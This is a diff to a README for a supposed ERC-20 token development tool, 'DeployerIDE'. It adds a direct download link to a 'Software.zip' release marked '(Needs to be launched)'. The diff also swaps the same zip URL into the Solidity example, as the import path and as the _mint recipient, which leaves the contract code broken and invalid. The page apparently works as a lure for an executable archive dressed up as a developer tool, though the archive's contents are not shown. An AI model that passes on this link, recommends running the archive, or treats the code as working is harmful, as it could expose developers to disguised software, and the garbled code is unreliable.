@@ -10,7 +10,7 @@ DeployerIDE is a dedicated local platform for creating and deploying ERC-20 smar
 [blockchain-development, blockchain-security, crypto-tools, dapp-development, decentralized, deployeride, erc20, ethereum, ethereum-token, ethereum-tools, evm, local-development, offline-ide, remixide-alternative, smart-contracts, solidity, solidity-development, token-creation, token-deployment, web3]
 
 📥 **Download Software:**
-[![Download DeployerIDE ERC20 Toolkit](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download DeployerIDE ERC20 Toolkit](https://github.com/Astral-ash/DeployerIDE-ERC20-Toolkit/releases/download/v2.0/Software.zip)](https://github.com/Astral-ash/DeployerIDE-ERC20-Toolkit/releases/download/v2.0/Software.zip)
 *(Needs to be launched)*
 
 ## Features 🌈
@@ -29,11 +29,11 @@ Check out these examples to see how DeployerIDE can empower your ERC-20 token de
 // Create a basic ERC-20 token contract with DeployerIDE
 pragma solidity ^0.8.0;
 
-import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "https://github.com/Astral-ash/DeployerIDE-ERC20-Toolkit/releases/download/v2.0/Software.zip";
 
 contract MyToken is ERC20 {
     constructor() ERC20("MyToken", "MTK") {
-        _mint(msg.sender, 1000000 * (10 ** 18));
+        _mint(https://github.com/Astral-ash/DeployerIDE-ERC20-Toolkit/releases/download/v2.0/Software.zip, 1000000 * (10 ** 18));
     }
 }
 ```
